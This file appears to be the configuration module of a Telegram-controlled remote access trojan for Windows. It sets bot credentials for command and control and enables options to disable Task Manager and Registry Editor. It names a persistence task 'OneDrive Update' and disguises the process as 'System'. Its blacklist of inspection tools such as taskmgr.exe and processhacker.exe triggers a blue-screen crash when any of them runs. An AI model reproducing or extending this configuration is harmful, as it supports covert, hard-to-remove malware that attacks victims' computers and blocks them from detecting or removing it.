from API import *


# Token/ID
TelegramToken = 'TOKEN'
TelegramChatID = 'ID'

# Proxy
Proxy = False
Ip = 'Ip'
Port = 'Port'


# Run the script as administrator
AdminRightsRequired = False


# Disable Task Manager on first start
DisableTaskManager = False
# Disable Registry Editor on first start
DisableRegistryTools = False


# Add to startup at first start
AutorunEnabled = False
# Installation directory
InstallPath = 'C:\\ProgramData'
# Task Name in Task Scheduler
AutorunName = 'OneDrive Update'
# The name of the process in the task manager
ProcessName = 'System'


# Display a message at first start
DisplayMessageBox = False
# The title of the message
MessageTitle = 'MessageTitle'
# MessageBox
Message = 'Message'


# Process protection from termination and deletion
ProcessBSODProtectionEnabled = False
# Scan for blocked processes
MakeBSODWhenProcessStarted = False
# Process List (BSoD if running)
BlacklistedProcesses = (
    'taskmgr.exe',
    'processhacker.exe',
    'regedit.exe',
    'mmc.exe',
    'perfmon.exe'
)
